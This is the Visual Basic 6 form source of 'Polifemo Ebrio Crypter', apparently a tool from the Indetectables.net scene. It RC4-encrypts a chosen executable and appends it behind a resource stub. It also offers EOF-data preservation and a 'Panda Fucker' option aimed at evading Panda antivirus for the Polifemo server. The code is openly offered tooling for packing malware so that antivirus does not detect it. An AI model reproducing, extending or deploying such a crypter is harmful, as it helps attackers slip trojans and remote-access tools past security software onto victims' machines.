VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Polifemo Ebrio Crypter"
   ClientHeight    =   1695
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   5145
   BeginProperty Font 
      Name            =   "Verdana"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   1695
   ScaleWidth      =   5145
   StartUpPosition =   1  'CenterOwner
   Begin MSComDlg.CommonDialog CD 
      Left            =   4560
      Top             =   480
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton cAbout 
      Caption         =   "About"
      Height          =   255
      Left            =   2880
      MouseIcon       =   "frmMain.frx":1F1DA
      MousePointer    =   99  'Custom
      TabIndex        =   6
      Top             =   1320
      Width           =   735
   End
   Begin VB.CommandButton cEncrypt 
      Caption         =   "Encrypt!"
      Height          =   255
      Left            =   1680
      MouseIcon       =   "frmMain.frx":1F4E4
      MousePointer    =   99  'Custom
      TabIndex        =   5
      Top             =   1320
      Width           =   1095
   End
   Begin VB.CommandButton cFile 
      Caption         =   "..."
      Height          =   255
      Left            =   4560
      MouseIcon       =   "frmMain.frx":1F7EE
      MousePointer    =   99  'Custom
      TabIndex        =   4
      Top             =   120
      Width           =   495
   End
   Begin VB.CheckBox cEOF 
      Caption         =   "EOF"
      Height          =   255
      Left            =   1680
      TabIndex        =   3
      Top             =   960
      Width           =   2775
   End
   Begin VB.CheckBox cPanda 
      Caption         =   "Panda Fucker (Only Polifemo Server)"
      Height          =   375
      Left            =   1680
      TabIndex        =   2
      Top             =   480
      Width           =   2775
   End
   Begin VB.TextBox txtFile 
      Height          =   285
      Left            =   1680
      Locked          =   -1  'True
      TabIndex        =   1
      Top             =   120
      Width           =   2775
   End
   Begin VB.PictureBox piC 
      AutoRedraw      =   -1  'True
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1440
      Left            =   120
      Picture         =   "frmMain.frx":1FAF8
      ScaleHeight     =   1380
      ScaleWidth      =   1425
      TabIndex        =   0
      Top             =   120
      Width           =   1485
   End
   Begin VB.Label lbl 
      Caption         =   "Indetectables.net"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF0000&
      Height          =   255
      Left            =   3720
      MouseIcon       =   "frmMain.frx":26BBA
      MousePointer    =   99  'Custom
      TabIndex        =   7
      Top             =   1320
      Width           =   1335
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cAbout_Click()
 MsgBox "[ Polifemo Ebrio Crypter ]" & vbNewLine & vbNewLine & ">> Author : SharkI" & vbNewLine & ">> Dedicated to : Polifemo" & vbNewLine & ">> Indetectables.net", vbInformation, Me.Caption
End Sub

Private Sub cEncrypt_Click()
 If txtFile.Text = "" Then MsgBox "Select a file to encrypt!", vbCritical, Me.Caption: Exit Sub
 File = FreeFile
 With CD
  .FileName = ""
  .DialogTitle = "Save encrypted file in.."
  .Filter = "Executables (.exe) | *.exe"
  .ShowSave
  If .FileName <> "" Then
   dEOF = ReadEOFData(txtFile.Text)
   Stb = LoadResData(101, "CUSTOM")
   Bin = Rc.EncryptString(Bin, "Borracho")
   If cPanda.Value = 0 Then
     Open .FileName For Binary As File
      Put File, , Stb
      Put File, , "(!)" & Bin
     Close File
   ElseIf cPanda.Value = 1 Then
     Open .FileName For Binary As File
      Put File, , Stb
      Put File, , "(!)" & Bin & "^"
     Close File
   End If
   If cEOF.Value = 1 Then WriteEOFData .FileName, dEOF
   MsgBox "The file has been encrypted!", vbInformation, Me.Caption
  End If
 End With
End Sub

Private Sub cFile_Click()
 File = FreeFile
 With CD
  .FileName = ""
  .DialogTitle = "Select file to encrypt!"
  .Filter = "Executables (.exe) | *.exe"
  .ShowOpen
  If .FileName <> "" Then
   txtFile.Text = .FileName
   Open .FileName For Binary As File
    Bin = Space(LOF(File))
    Get File, , Bin
   Close File
  End If
 End With
End Sub

Private Sub lbl_Click()
 ShellExecute 0, "", "http://indetectables.net", "", "", 1
End Sub
